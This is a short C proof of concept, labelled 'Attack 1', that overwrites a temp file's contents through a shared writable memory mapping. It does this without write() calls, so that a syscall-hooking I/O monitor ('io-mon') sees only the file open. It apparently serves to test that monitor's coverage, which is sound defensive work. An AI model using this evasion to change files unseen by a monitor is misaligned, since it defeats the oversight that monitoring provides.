/* Attack 1: MAP_SHARED write-back. Modify an output file's CONTENT through a
 * PROT_WRITE/MAP_SHARED mapping with NO write()/pwrite() syscall. io-mon sees
 * only the O_RDWR open; the actual content bytes never pass a hooked call. */
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <string.h>
#include <stdio.h>
int main(int argc, char**argv){
  const char *out = "/tmp/r2_mmap/mmap_output.bin";
  char fill = (argc>1)? argv[1][0] : 'A';
  int fd = open(out, O_RDWR);
  struct stat st; fstat(fd,&st);
  char *m = mmap(0, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
  if(m==MAP_FAILED){perror("mmap");return 1;}
  memset(m, fill, st.st_size);      /* content change, no write() syscall */
  msync(m, st.st_size, MS_SYNC);
  munmap(m, st.st_size);
  close(fd);
  return 0;
}
